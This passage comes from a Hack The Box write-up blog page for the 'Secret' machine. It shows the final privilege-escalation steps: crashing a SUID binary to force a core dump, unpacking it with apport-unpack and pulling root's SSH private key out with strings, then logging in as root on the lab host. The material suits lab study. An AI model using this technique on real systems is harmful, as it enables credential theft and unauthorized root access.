+        data-srcset="/assets/images/secret/20220326114727.png, /assets/images/secret/20220326114727.png 1.5x, /assets/images/secret/20220326114727.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326114727.png"
+        title="error" /></p>
+<p>hence it is set to <strong>1</strong> in our case this means we can dump it if it receives a signal like &ldquo;interrupt&rdquo; while it is running</p>
+<p>so we will get another reverse shell on another port</p>
+<p>in shell-1 : run the binary and specify the file you want
+in shell-2 : kill the process <code>ex: kill -SIGSEGV 1718 </code></p>
+<p>now as we have dumped it where is the dumps ? , reading <a href="https://refspecs.linuxfoundation.org/FHS_2.3/fhs-2.3.html#VARCRASHSYSTEMCRASHDUMPS" target="_blank" rel="noopener noreffer ">here</a> it should be at <code>/var/crash</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326120021.png"
+        data-srcset="/assets/images/secret/20220326120021.png, /assets/images/secret/20220326120021.png 1.5x, /assets/images/secret/20220326120021.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326120021.png"
+        title="error" /></p>
+<p>shell -1 :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326120642.png"
+        data-srcset="/assets/images/secret/20220326120642.png, /assets/images/secret/20220326120642.png 1.5x, /assets/images/secret/20220326120642.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326120642.png"
+        title="error" /></p>
+<p>shell -2 :</p>
+<p>get PID from the <code>ps aux</code> command</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326120717.png"
+        data-srcset="/assets/images/secret/20220326120717.png, /assets/images/secret/20220326120717.png 1.5x, /assets/images/secret/20220326120717.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326120717.png"
+        title="error" /></p>
+<p>and we see our dump :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326120755.png"
+        data-srcset="/assets/images/secret/20220326120755.png, /assets/images/secret/20220326120755.png 1.5x, /assets/images/secret/20220326120755.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326120755.png"
+        title="error" /></p>
+<p>reading <a href="https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash" target="_blank" rel="noopener noreffer ">here</a> to know what to do with a <code>.crash</code> file</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apport-unpack  _opt_count.1000.crash /tmp/dumps</span></span></code></pre></div></div>
+<p>now perform <code>strings</code> on <code>CoreDump</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326121010.png"
+        data-srcset="/assets/images/secret/20220326121010.png, /assets/images/secret/20220326121010.png 1.5x, /assets/images/secret/20220326121010.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326121010.png"
+        title="error" /></p>
+<h2 id="root-access">Root Access</h2>
+<p>Hence we Have port <strong>22</strong> open ,now save the <code>id_rsa</code> and :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod <span class="m">600</span> id_rsa
+</span></span><span class="line"><span class="cl">ssh root@10.10.11.120 -i id_rsa</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/secret/20220326121210.png"
+        data-srcset="/assets/images/secret/20220326121210.png, /assets/images/secret/20220326121210.png 1.5x, /assets/images/secret/20220326121210.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/secret/20220326121210.png"
+        title="error" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-26</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-03-26-secret/" data-title="Secret Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,API,JWT,SUID,core-dump"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-03-26-secret/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-03-26-secret/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-03-26-secret%2f&amp;text=Secret%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/api/">API</a>,&nbsp;<a href="/tags/jwt/">JWT</a>,&nbsp;<a href="/tags/suid/">SUID</a>,&nbsp;<a href="/tags/core-dump/">Core-Dump</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/linux-machines/2022-03-11-devzat/" class="prev" rel="prev" title="Devzat Hackthebox writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Devzat Hackthebox writeup</a>
+            <a href="/posts/linux-machines/2022-04-01-shibboleth/" class="next" rel="next" title="Shibboleth Hackthebox writeup">Shibboleth Hackthebox writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
